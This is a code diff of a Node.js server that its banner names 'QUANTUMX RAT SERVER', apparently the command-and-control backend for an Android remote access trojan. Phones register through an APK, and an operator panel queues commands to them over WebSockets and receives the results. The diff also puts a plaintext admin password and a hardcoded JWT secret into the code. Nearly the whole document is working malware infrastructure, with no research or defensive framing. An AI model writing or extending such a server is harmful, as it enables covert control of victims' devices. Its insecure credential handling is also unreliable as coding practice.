@@ -2,9 +2,7 @@ const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
-const path = require('path');
 const jwt = require('jsonwebtoken');
-const bcrypt = require('bcryptjs');
 
 const app = express();
 const server = http.createServer(app);
@@ -20,36 +18,31 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// ========== DATABASE SEDERHANA (In-Memory) ==========
+// ========== DATABASE ==========
 let users = [
     {
         id: 1,
         username: 'admin',
-        password: '$2a$10$XQ8KqVHR4t7yKqFqX8KqVHR4t7yKqFqX8KqVHR4t7yKqFqX8KqVH', // hash dari "quantumx"
+        password: 'quantumx',
         role: 'admin'
     }
 ];
 
-let devices = new Map(); // deviceId -> device info
-let commands = new Map(); // deviceId -> array of commands
-let commandResults = new Map(); // commandId -> result
+let devices = new Map();
+let commands = new Map();
+let commandResults = new Map();
 
-// ========== AUTHENTICATION ==========
+// ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
 
-// Middleware verify token
 function authenticateToken(req, res, next) {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     
-    if (!token) {
-        return res.status(401).json({ error: 'No token provided' });
-    }
+    if (!token) return res.status(401).json({ error: 'No token provided' });
     
     jwt.verify(token, JWT_SECRET, (err, user) => {
-        if (err) {
-            return res.status(403).json({ error: 'Invalid token' });
-        }
+        if (err) return res.status(403).json({ error: 'Invalid token' });
         req.user = user;
         next();
     });
@@ -60,11 +53,8 @@ function authenticateToken(req, res, next) {
 // Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    
-    // Cari user
     const user = users.find(u => u.username === username);
     
-    // Cek password (sederhana, karena bcrypt ribet buat contoh)
     if (user && password === 'quantumx') {
         const token = jwt.sign(
             { id: user.id, username: user.username, role: user.role },
@@ -72,16 +62,10 @@ app.post('/api/login', (req, res) => {
             { expiresIn: '24h' }
         );
         
-        res.json({
-            success: true,
-            token: token,
-            user: {
-                id: user.id,
-                username: user.username,
-                role: user.role
-            }
-        });
+        console.log(`✅ [LOGIN] ${username} - SUCCESS`);
+        res.json({ success: true, token, user });
     } else {
+        console.log(`❌ [LOGIN] ${username} - FAILED`);
         res.status(401).json({ success: false, error: 'Invalid credentials' });
     }
 });
@@ -91,18 +75,9 @@ app.post('/api/verify', authenticateToken, (req, res) => {
     res.json({ success: true, user: req.user });
 });
 
-// ========== DEVICE API ==========
-
-// Device register (dipanggil sama APK)
+// Device register
 app.post('/api/device/register', (req, res) => {
-    const {
-        deviceId,
-        deviceName,
-        androidVersion,
-        manufacturer,
-        model,
-        batteryLevel
-    } = req.body;
+    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel } = req.body;
     
     const deviceInfo = {
         deviceId,
@@ -119,21 +94,16 @@ app.post('/api/device/register', (req, res) => {
     
     devices.set(deviceId, deviceInfo);
     
-    console.log(`📱 Device registered: ${deviceName} (${deviceId})`);
+    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
     
-    res.json({
-        success: true,
-        deviceId: deviceId,
-        message: 'Device registered successfully'
-    });
+    res.json({ success: true, deviceId, message: 'Device registered' });
 });
 
-// Get all devices (protected)
+// Get all devices
 app.get('/api/devices', authenticateToken, (req, res) => {
     const deviceList = Array.from(devices.values());
-    
-    // Update online status (anggap online jika lastSeen < 2 menit)
     const now = new Date();
+    
     deviceList.forEach(device => {
         const lastSeen = new Date(device.lastSeen);
         const diffMinutes = (now - lastSeen) / (1000 * 60);
@@ -143,52 +113,14 @@ app.get('/api/devices', authenticateToken, (req, res) => {
     res.json(deviceList);
 });
 
-// Get single device
-app.get('/api/device/:deviceId', authenticateToken, (req, res) => {
-    const device = devices.get(req.params.deviceId);
-    
-    if (!device) {
-        return res.status(404).json({ error: 'Device not found' });
-    }
-    
-    // Update online status
-    const now = new Date();
-    const lastSeen = new Date(device.lastSeen);
-    const diffMinutes = (now - lastSeen) / (1000 * 60);
-    device.online = diffMinutes < 2;
-    
-    res.json(device);
-});
-
-// Update device last seen (heartbeat)
-app.post('/api/device/:deviceId/heartbeat', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
-    if (device) {
-        device.lastSeen = new Date().toISOString();
-        device.online = true;
-        device.batteryLevel = req.body.batteryLevel || device.batteryLevel;
-        devices.set(deviceId, device);
-    }
-    
-    res.json({ success: true });
-});
-
-// ========== COMMAND API ==========
-
-// Send command to device
+// Send command
 app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, params } = req.body;
     
-    // Generate command ID
     const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
     
-    // Simpan command
-    if (!commands.has(deviceId)) {
-        commands.set(deviceId, []);
-    }
+    if (!commands.has(deviceId)) commands.set(deviceId, []);
     
     const commandData = {
         commandId,
@@ -201,34 +133,19 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     
     commands.get(deviceId).push(commandData);
     
-    // Emit ke device via WebSocket
+    // Emit ke device
     io.to(deviceId).emit('command', commandData);
     
-    console.log(`📤 Command sent to ${deviceId}: ${command}`);
+    const deviceName = devices.get(deviceId)?.deviceName || deviceId;
+    console.log(`📤 [COMMAND] FLASH -> ${deviceName} (${deviceId}) | DURATION: ${params.duration}s`);
     
-    res.json({
-        success: true,
-        commandId: commandId,
-        message: 'Command sent to device'
-    });
+    res.json({ success: true, commandId, message: 'Command sent' });
 });
 
-// Get pending commands for device (dipanggil APK)
-app.get('/api/device/:deviceId/commands/pending', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const deviceCommands = commands.get(deviceId) || [];
-    
-    // Ambil command yang masih pending
-    const pending = deviceCommands.filter(cmd => cmd.status === 'pending');
-    
-    res.json(pending);
-});
-
-// Submit command result (dipanggil APK)
+// Command result
 app.post('/api/device/command/result', (req, res) => {
     const { commandId, deviceId, status, result } = req.body;
     
-    // Update command status
     const deviceCommands = commands.get(deviceId) || [];
     const commandIndex = deviceCommands.findIndex(cmd => cmd.commandId === commandId);
     
@@ -238,7 +155,6 @@ app.post('/api/device/command/result', (req, res) => {
         deviceCommands[commandIndex].completedAt = new Date().toISOString();
         commands.set(deviceId, deviceCommands);
         
-        // Simpan result terpisah
         commandResults.set(commandId, {
             deviceId,
             command: deviceCommands[commandIndex].command,
@@ -247,44 +163,29 @@ app.post('/api/device/command/result', (req, res) => {
             completedAt: new Date().toISOString()
         });
         
-        // Emit ke panel via WebSocket
-        io.emit('command-result', {
-            commandId,
-            deviceId,
-            status,
-            result
-        });
+        io.emit('command-result', { commandId, deviceId, status, result });
         
-        console.log(`📥 Command result from ${deviceId}: ${commandId}`);
+        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
+        if (status === 'completed') {
+            console.log(`✅ [SUCCESS] FLASH -> ${deviceName} | DURATION: ${result?.duration}s`);
+        } else {
+            console.log(`❌ [FAILED] FLASH -> ${deviceName}`);
+        }
     }
     
     res.json({ success: true });
 });
 
-// Get command result
-app.get('/api/command/:commandId/result', authenticateToken, (req, res) => {
-    const result = commandResults.get(req.params.commandId);
-    
-    if (!result) {
-        return res.status(404).json({ error: 'Command result not found' });
-    }
-    
-    res.json(result);
-});
-
 // ========== WEBSOCKET ==========
-
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
+    console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
     
-    // Device register via WebSocket
     socket.on('device-connect', (data) => {
         const { deviceId, deviceName } = data;
         
         socket.deviceId = deviceId;
         socket.join(deviceId);
         
-        // Update device status
         if (devices.has(deviceId)) {
             const device = devices.get(deviceId);
             device.online = true;
@@ -292,9 +193,8 @@ io.on('connection', (socket) => {
             devices.set(deviceId, device);
         }
         
-        console.log(`📱 Device online: ${deviceName} (${deviceId})`);
+        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId})`);
         
-        // Broadcast ke panel
         io.emit('device-status', {
             deviceId,
             status: 'online',
@@ -302,39 +202,36 @@ io.on('connection', (socket) => {
         });
     });
     
-    // Panel connect
-    socket.on('panel-connect', (data) => {
+    socket.on('panel-connect', () => {
         socket.isPanel = true;
-        console.log('🖥️ Panel connected');
+        console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
     });
     
-    // Device disconnect
     socket.on('disconnect', () => {
         if (socket.deviceId) {
             const deviceId = socket.deviceId;
             
-            // Update device status
             if (devices.has(deviceId)) {
                 const device = devices.get(deviceId);
                 device.online = false;
                 devices.set(deviceId, device);
             }
             
-            console.log(`📱 Device offline: ${deviceId}`);
+            const deviceName = devices.get(deviceId)?.deviceName || deviceId;
+            console.log(`📱 [DEVICE] OFFLINE: ${deviceName} (${deviceId})`);
             
-            // Broadcast ke panel
             io.emit('device-status', {
                 deviceId,
                 status: 'offline',
                 timestamp: new Date().toISOString()
             });
         } else {
-            console.log('🔌 Client disconnected:', socket.id);
+            console.log(`🔌 [SOCKET] DISCONNECTED: ${socket.id}`);
         }
     });
 });
 
-// ========== STATS API ==========
+// ========== STATS ==========
 app.get('/api/stats', authenticateToken, (req, res) => {
     const deviceList = Array.from(devices.values());
     const now = new Date();
@@ -354,15 +251,15 @@ app.get('/api/stats', authenticateToken, (req, res) => {
     });
 });
 
-// ========== START SERVER ==========
+// ========== START ==========
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
-    ╔═══════════════════════════════════════╗
-    ║   QUANTUMX RAT SERVER v1.0            ║
-    ║   Running on port: ${PORT}                     ║
-    ║   WebSocket: ws://localhost:${PORT}            ║
-    ║   API: http://localhost:${PORT}/api           ║
-    ╚═══════════════════════════════════════╝
+╔═══════════════════════════════════════╗
+║    QUANTUMX RAT SERVER v2.0           ║
+║    RUNNING ON PORT: ${PORT}                      ║
+║    WEBSOCKET: ws://localhost:${PORT}             ║
+║    API: http://localhost:${PORT}/api            ║
+╚═══════════════════════════════════════╝
     `);
 });
